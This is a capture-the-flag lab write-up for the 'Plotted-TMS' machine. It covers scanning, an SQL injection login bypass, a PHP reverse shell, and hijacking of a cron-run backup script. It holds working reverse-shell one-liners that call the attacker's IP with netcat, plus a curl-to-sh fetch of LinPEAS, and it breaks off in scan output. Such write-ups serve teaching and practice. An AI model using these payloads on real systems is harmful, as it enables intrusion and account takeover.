---
Everything here is plotted!
---

# Plotted-TMS — Writeup

## Overview
### Plotted-TMS — Writeup
### Plotted-TMS — Writeup
![](https://wiki.thehacker.nz/wp-content/uploads/2021/10/pe_banner.png)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/6187c9220cd0ff0c5c3b29b9aa6252ea.png)
![](https://wiki.thehacker.nz/wp-content/uploads/2021/10/pe_banner.png)
Happy Hunting!
Tip: Enumeration is key!

## Enumeration
```text
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ sudo rustscan -a 10.10.113.202      
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.113.202:22
Open 10.10.113.202:80
Open 10.10.113.202:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 12:36 EDT
Initiating Ping Scan at 12:36
Scanning 10.10.113.202 [4 ports]
Completed Ping Scan at 12:36, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:36
Completed Parallel DNS resolution of 1 host. at 12:36, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:36
Scanning 10.10.113.202 [3 ports]
Discovered open port 445/tcp on 10.10.113.202
Discovered open port 80/tcp on 10.10.113.202
Discovered open port 22/tcp on 10.10.113.202
Completed SYN Stealth Scan at 12:36, 0.23s elapsed (3 total ports)
Nmap scan report for 10.10.113.202
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2022-09-24 12:36:22 EDT for 0s

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```
```text
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ feroxbuster --url http://10.10.113.202 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.113.202
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      964w    10918c http://10.10.113.202/
301      GET        9l       28w      314c http://10.10.113.202/admin => http://10.10.113.202/admin/
200      GET      375l      964w    10918c http://10.10.113.202/index.html
200      GET        1l        1w       25c http://10.10.113.202/passwd
200      GET        1l        1w       81c http://10.10.113.202/admin/id_rsa
200      GET        1l        1w       25c http://10.10.113.202/shadow
[####################] - 48s    13842/13842   0s      found:6       errors:206    
[####################] - 44s     4614/4614    109/s   http://10.10.113.202 
[####################] - 44s     4614/4614    106/s   http://10.10.113.202/ 
[####################] - 39s     4614/4614    117/s   http://10.10.113.202/admin 

http://10.10.113.202/admin/id_rsa

VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE > Trust me it is not this easy..now get back to enumeration :D

http://10.10.113.202/shadow

bm90IHRoaXMgZWFzeSA6RA== > not this easy :D

http://10.10.113.202/passwd
bm90IHRoaXMgZWFzeSA6RA== > not this easy :D

http://10.10.113.202:445/
```
```text
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ feroxbuster --url http://10.10.113.202:445 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.113.202:445
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      964w    10918c http://10.10.113.202:445/
200      GET      375l      964w    10918c http://10.10.113.202:445/index.html
301      GET        9l       28w      324c http://10.10.113.202:445/management => http://10.10.113.202:445/management/
301      GET        9l       28w      330c http://10.10.113.202:445/management/admin => http://10.10.113.202:445/management/admin/
301      GET        9l       28w      331c http://10.10.113.202:445/management/assets => http://10.10.113.202:445/management/assets/
301      GET        9l       28w      330c http://10.10.113.202:445/management/build => http://10.10.113.202:445/management/build/
[#######>------------] - 36s    10052/27684   1m      found:6       errors:89     
[#######>------------] - 36s    10053/27684   1m      found:6       errors:89     
301      GET        9l       28w      332c http://10.10.113.202:445/management/classes => http://10.10.113.202:445/management/classes/
[######>-------------] - 36s    10088/32298   1m      found:6       errors:89     
[######>-------------] - 36s    10098/32298   1m      found:7       errors:89     
[######>-------------] - 36s    10111/32298   1m      found:7       errors:89     
[######>-------------] - 36s    10140/32298   1m      found:7       errors:89     
[######>-------------] - 36s    10177/32298   1m      found:7       errors:89     
[######>-------------] - 36s    10204/32298   1m      found:7       errors:89     
[######>-------------] - 36s    10204/32298   1m      found:7       errors:89     
[###################>] - 36s     4608/4614    130/s   http://10.10.113.202:445 
[######>-------------] - 36s    10206/32298   1m      found:7       errors:89     
[###################>] - 36s     4608/4614    130/s   http://10.10.113.202:445 
[######>-------------] - 36s    10214/32298   1m      found:7       errors:89     
[###################>] - 36s     4608/4614    130/s   http://10.10.113.202:445 
[###################>] - 35s     4594/4614    132/s   http://10.10.113.202:445/ 
[######>-------------] - 36s    10229/32298   1m      found:7       errors:89     
[###################>] - 36s     4608/4614    130/s   http://10.10.113.202:445 
[###################>] - 35s     4594/4614    132/s   http://10.10.113.202:445/ 
[######>-------------] - 36s    10257/32298   1m      found:7       errors:89     
[###################>] - 36s     4608/4614    130/s   http://10.10.113.202:445 
[###################>] - 35s     4594/4614    132/s   http://10.10.113.202:445/ 
[######>-------------] - 37s    10290/32298   1m      found:7       errors:89     
[###################>] - 37s     4610/4614    128/s   http://10.10.113.202:445 
[###################>] - 35s     4596/4614    131/s   http://10.10.113.202:445/ 
[######>-------------] - 37s    10317/32298   1m      found:7       errors:89     
[###################>] - 37s     4610/4614    128/s   http://10.10.113.202:445 
[###################>] - 35s     4597/4614    131/s   http://10.10.113.202:445/ 
[######>-------------] - 37s    10331/32298   1m      found:7       errors:89     
[###################>] - 37s     4610/4614    128/s   http://10.10.113.202:445 
[###################>] - 35s     4597/4614    131/s   http://10.10.113.202:445/ 
[######>-------------] - 37s    10355/32298   1m      found:7       errors:89     
[###################>] - 37s     4610/4614    128/s   http://10.10.113.202:445 
[###################>] - 35s     4597/4614    131/s   http://10.10.113.202:445/ 
301      GET        9l       28w      333c http://10.10.113.202:445/management/database => http://10.10.113.202:445/management/database/

I use Firefox dev tools to capture and inspect the network traffic, looking for any vulnerabilities on the web application. I then submit a blank username and password. The response is an error message.

However, I find the exact SQL query structure used to sign in when inspecting the response.

Query Breakdown

    SELECT * from users where username = '' and password = md5('')

I can attempt to supply any username and force a true statement with this knowledge by adding or 1=1. Then add the hash sign (#) to comment out the rest of the query. 

Since the password will no longer be part of the query, I can enter any password and attempt to sign in. The new SQL query will look like this,

    SELECT * from users where username = '' or 1=1 # and password = md5('')

successful

log in as admin

' or 1 = 1 # 
witty

or

admin' or 1+1--'

or through metasploit 

msfconsole -q -x "use multi/handler; set payload generic/shell_reverse_tcp; set lhost 10.18.1.77; set lport 4444; exploit"

then upload a revshell php (create new staff)
```
```text
┌──(kali㉿kali)-[~]
└─$ cat shell.php          
<?php
        system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.1.77 4444 >/tmp/f");
?>

nice :) the shell.php monkeypentest not work for me so
https://www.revshells.com/
```
```text
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ rlwrap nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.113.202.
Ncat: Connection from 10.10.113.202:59050.
bash: cannot set terminal process group (12284): Inappropriate ioctl for device
bash: no job control in this shell
www-data@plotted:/var/www/html/445/management/uploads$ pwd
pwd
/var/www/html/445/management/uploads

www-data@plotted:/var/www/html/445/management/uploads$ cd /home
cd /home
www-data@plotted:/home$ ls
ls
plot_admin
ubuntu
www-data@plotted:/home$ cd plot_admin
cd plot_admin
www-data@plotted:/home/plot_admin$ ls
ls
tms_backup
user.txt
www-data@plotted:/home/plot_admin$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

Fortunately, right above the user flag, there is a tms_backup directory. Whenever I see backup, I think Cron jobs. That is because backups usually are done periodically and need a scheduled task or cron job to execute a command to backup the commands.

Horizontal Escalation

www-data@plotted:/home/plot_admin$ cat /etc/crontab
cat /etc/crontab
```
```text
# /etc/crontab: system-wide crontab
```
```text
# Unlike any other crontab you don't have to run the `crontab'
```
```text
# command to install the new version when you edit this file
```
```text
# and files in /etc/cron.d. These files also have username fields,
```
```text
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```
```text
# Example of job definition:
```
```text
# .---------------- minute (0 - 59)
```
```text
# |  .------------- hour (0 - 23)
```
```text
# |  |  .---------- day of month (1 - 31)
```
```text
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
```
```text
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
```
```text
# |  |  |  |  |
```
```text
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   plot_admin /var/www/scripts/backup.sh

www-data@plotted:/home/plot_admin$ ls -lah /var/www/scripts/backup.sh
ls -lah /var/www/scripts/backup.sh
-rwxrwxr-- 1 plot_admin plot_admin 141 Oct 28  2021 /var/www/scripts/backup.sh

www-data@plotted:/home/plot_admin$ ls -lah /var/www/scripts
ls -lah /var/www/scripts
total 12K
drwxr-xr-x 2 www-data   www-data   4.0K Oct 28  2021 .
drwxr-xr-x 4 root       root       4.0K Oct 28  2021 ..
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh

    Create a new backup.sh file with a reverse shell script and changed it to be executable using chmod.
    setup a Netcat listener on my attack machine
    A few seconds later, the cronjob will run and attach the reverse shell to my waiting Netcat listener. Then I can stabilize the shell using the same technique.

www-data@plotted:/home/plot_admin$ rm -fr /var/www/scripts/
rm -fr /var/www/scripts/
rm: cannot remove '/var/www/scripts/': Permission denied
www-data@plotted:/home/plot_admin$ ls -la /var/www/scripts/
ls -la /var/www/scripts/
total 8
drwxr-xr-x 2 www-data www-data 4096 Sep 24 17:28 .
drwxr-xr-x 4 root     root     4096 Oct 28  2021 ..
www-data@plotted:/home/plot_admin$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.1.77 4321 >/tmp/f" > /var/www/scripts/backup.sh
<.18.1.77 4321 >/tmp/f" > /var/www/scripts/backup.sh
www-data@plotted:/home/plot_admin$ chmod +x /var/www/scripts/backup.sh
chmod +x /var/www/scripts/backup.sh
```
```text
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4321              
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
Ncat: Connection from 10.10.113.202.
Ncat: Connection from 10.10.113.202:35494.
bash: cannot set terminal process group (44206): Inappropriate ioctl for device
bash: no job control in this shell
plot_admin@plotted:~$ ls
ls
tms_backup
user.txt
plot_admin@plotted:~$ cat user.txt
cat user.txt
77927510d5edacea1f9e86602f1fbadb

Vertical Scalation

using linpeas.sh
```

## Privilege Escalation
```text
┌──(kali㉿kali)-[~]
└─$ locate linpeas.sh               
/home/kali/Downloads/linpeas.sh
```
```text
┌──(kali㉿kali)-[~]
└─$ cd /home/kali/Downloads
```
```text
┌──(kali㉿kali)-[~/Downloads] (php server)
└─$ php -S 10.18.1.77:3000                                         
[Sat Sep 24 13:32:21 2022] PHP 8.1.5 Development Server (http://10.18.1.77:3000) started

    Spin up a PHP server on my Kali machine to host the script
    php -S attacker_ip:port
    Curl with -s (silent) to load the script on the target machine and pipe it through sh to run LinPEAS.

plot_admin@plotted:~$ curl -s 10.18.1.77:3000/linpeas.sh | sh
curl -s 10.18.1.77:3000/linpeas.sh | sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                          
    |---------------------------------------------------------------------------|                          
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |                          
    |         Follow on Twitter   :     @carlospolopm                           |                          
    |         Respect on HTB      :     SirBroccoli                             |                          
    |---------------------------------------------------------------------------|                          
    |                                 Thank you!                                |                          
    \---------------------------------------------------------------------------/                          
          linpeas-ng by carlospolop                                                                        
                                                                                                           
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                       
                                                                                                           
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                   
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════    
                                         ╚═══════════════════╝                                             
OS: Linux version 5.4.0-89-generic (buildd@lgw01-amd64-044) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021
User & Groups: uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
Hostname: plotted
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                         
                                                                                                           

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                           
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════     
                                        ╚════════════════════╝                                             
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                         
Linux version 5.4.0-89-generic (buildd@lgw01-amd64-044) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                            
Sudo version 1.8.31                                                                                        

╔══════════╣ CVEs Check
sh: 1197: [[: not found                                                                                    
sh: 1197: rpm: not found
sh: 1197: 0: not found
sh: 1207: [[: not found

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                    
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin                                               
New path exported: /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

╔══════════╣ Date & uptime
Sat 24 Sep 2022 05:33:51 PM UTC                                                                            
 17:33:51 up  1:46,  0 users,  load average: 0.39, 0.23, 1.06

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                       

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices                                                                 
/dev/disk/by-id/dm-uuid-LVM-LEuxtXS8h12uzcCSf2F85IqR3S0l2bEjyOqkxbWIUUDLX1WMBnxMK0nNX5ByOzka    /       ext4       defaults        0 1
/dev/disk/by-uuid/4f0655ba-9502-4545-9d47-131a77a3469d  /boot   ext4    defaults        0 1

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                    
LESSOPEN=| /bin/lesspipe %s                                                                                
HISTFILESIZE=0
SHLVL=0
HOME=/home/plot_admin
LOGNAME=plot_admin
_=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=
SHELL=/bin/sh
LESSCLOSE=/bin/lesspipe %s %s
PWD=/home/plot_admin
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed     
dmesg Not Found                                                                                            
                                                                                                           
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                         
[+] [CVE-2021-4034] PwnKit                                                                                 

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                    
                                                                                                           
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.              
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                          
═╣ Execshield enabled? ............ Execshield Not Found                                                   
═╣ SELinux enabled? ............... sestatus Not Found                                                     
═╣ Is ASLR enabled? ............... Yes                                                                    
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                              

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════    
                                             ╚═══════════╝                                                 
╔══════════╣ Container related tools present
╔══════════╣ Container details                                                                             
═╣ Is this a container? ........... No                                                                     
═╣ Any running containers? ........ No                                                                     
                                                                                                           

                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════     
                          ╚════════════════════════════════════════════════╝                               
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                           
root           1  0.5  1.0 168968 10392 ?        Ss   15:47   0:32 /lib/systemd/systemd --system --deserialize 34
root         485  0.0  1.7 280200 17992 ?        SLsl 15:47   0:00 /sbin/multipathd -d -s
root         602  0.0  0.6 1232936 6352 ?        Ssl  15:48   0:01 /usr/bin/amazon-ssm-agent
root         721  0.0  1.3 1317964 13964 ?       Sl   15:48   0:01  _ /usr/bin/ssm-agent-worker
root         606  0.0  0.2   6812  2452 ?        Ss   15:48   0:00 /usr/sbin/cron -f
root       44205  0.0  0.3   8476  3108 ?        S    17:30   0:00  _ /usr/sbin/CRON -f
plot_ad+   44206  0.0  0.0   2608   608 ?        Ss   17:30   0:00      _ /bin/sh -c /var/www/scripts/backup.sh                                                                                                       
plot_ad+   44207  0.0  0.0   2608   608 ?        S    17:30   0:00          _ /bin/sh /var/www/scripts/backup.sh                                                                                                      
plot_ad+   44210  0.0  0.0   5620   504 ?        S    17:30   0:00              _ cat /tmp/f
plot_ad+   44211  0.0  0.4   8180  4624 ?        S    17:30   0:00              _ /bin/bash -i
plot_ad+   44267  0.0  1.0  24752 10072 ?        S    17:33   0:00              |   _ curl -s 10.18.1.77:3000/linpeas.sh
plot_ad+   44268  0.1  0.3   3924  3156 ?        S    17:33   0:00              |   _ sh
plot_ad+   47071  0.0  0.1   3924  1356 ?        S    17:33   0:00              |       _ sh
plot_ad+   47075  0.0  0.3   9044  3216 ?        R    17:33   0:00              |       |   _ ps fauxwww
plot_ad+   47074  0.0  0.1   3924  1356 ?        S    17:33   0:00              |       _ sh
plot_ad+   44212  0.0  0.1   3332  1952 ?        S    17:30   0:00              _ nc 10.18.1.77 4321
message+     609  0.0  0.4   7924  4204 ?        Ss   15:48   0:03 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         621  0.0  1.1  29080 11200 ?        Ss   15:48   0:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog       625  0.0  0.3 224348  3528 ?        Ssl  15:48   0:00 /usr/sbin/rsyslogd -n -iNONE
root         627  0.4  1.8 733876 18188 ?        Ssl  15:48   0:28 /usr/lib/snapd/snapd
root         630  0.0  0.4  16572  4236 ?        Ss   15:48   0:01 /lib/systemd/systemd-logind
root         634  0.0  0.3 394720  3460 ?        Ssl  15:48   0:00 /usr/lib/udisks2/udisksd
daemon[0m       640  0.0  0.2   3792  2100 ?        Ss   15:48   0:00 /usr/sbin/atd -f
root         691  0.0  0.1   5600  1724 ttyS0    Ss+  15:48   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root         697  0.0  0.1   5828  1660 tty1     Ss+  15:48   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         722  0.0  0.4 238416  4084 ?        Ssl  15:48   0:00 /usr/libexec/polkitd --no-debug
root         769  0.0  1.1 107908 11264 ?        Ssl  15:48   0:01 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
mysql        796  0.2 35.9 1301108 359896 ?      Ssl  15:48   0:17 /usr/sbin/mysqld
root        1772  0.0  0.3  21256  3860 ?        Ss   16:16   0:01 /lib/systemd/systemd-udevd
root       12284  0.1  0.9 194056  9420 ?        Ss   16:18   0:04 /usr/sbin/apache2 -k start
www-data   39056  0.0  0.8 194616  8936 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
www-data   39085  0.0  0.9 194624  9948 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
www-data   39096  0.0  0.9 194616  9844 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
www-data   39099  0.0  1.0 194672 10124 ?        S    16:46   0:01  _ /usr/sbin/apache2 -k start
www-data   43460  0.0  0.0   2608   560 ?        S    17:17   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.1.77 4444 >/tmp/f
www-data   43463  0.0  0.0   2652   564 ?        S    17:17   0:00  |       _ cat /tmp/f
www-data   43464  0.0  0.3   4236  3184 ?        S    17:17   0:00  |       _ /bin/bash -i
www-data   43465  0.0  0.1   3332  1864 ?        S    17:17   0:00  |       _ nc 10.18.1.77 4444
www-data   39100  0.0  1.0 194616 10080 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
www-data   39107  0.0  1.0 194672 10220 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
www-data   39117  0.0  1.0 194680 10096 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
www-data   39140  0.0  1.0 194620 10124 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
www-data   39152  0.0  1.0 194880 10584 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
www-data   39160  0.0  0.9 194640  9804 ?        S    16:47   0:00  _ /usr/sbin/apache2 -k start
root       12382  0.0  0.6 455868  6804 ?        Ssl  16:18   0:00 /usr/libexec/fwupd/fwupd
